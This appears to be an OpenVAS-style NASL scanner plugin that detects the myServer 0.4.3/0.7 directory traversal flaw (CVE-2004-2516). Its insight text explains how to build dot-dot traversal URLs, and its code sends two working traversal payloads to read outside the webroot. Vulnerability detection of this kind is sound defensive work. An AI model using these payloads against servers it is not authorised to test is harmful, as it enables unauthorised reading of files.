if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11851" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2004-2516" );
	script_bugtraq_id( 11189 );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "myServer 0.4.3 / 0.7 Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2003 Westpoint Ltd" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/339145" );
	script_tag( name: "solution", value: "Upgrade to myServer 0.7.1 or later." );
	script_tag( name: "summary", value: "This web server is running myServer <= 0.4.3 or 0.7. This version contains
  a directory traversal vulnerability, that allows remote users with
  no authentication to read files outside the webroot." );
	script_tag( name: "insight", value: "You have to create a dot-dot URL with the same number of '/./' and '/../' + 1.
  For example, you can use:

  /././..

  /./././../..

  /././././../../..

  /./././././../../../..

  etc. or a long URL starting with ./././. etc." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
for pattern in make_list( "/././..",
	 "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../" ) {
	req = http_get( item: pattern, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		continue;
	}
	if(ereg( pattern: "^HTTP/1\\.[01] 200 ", string: res ) && egrep( pattern: "Contents of folder \\.\\.", string: res, icase: TRUE )){
		report = http_report_vuln_url( port: port, url: pattern );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

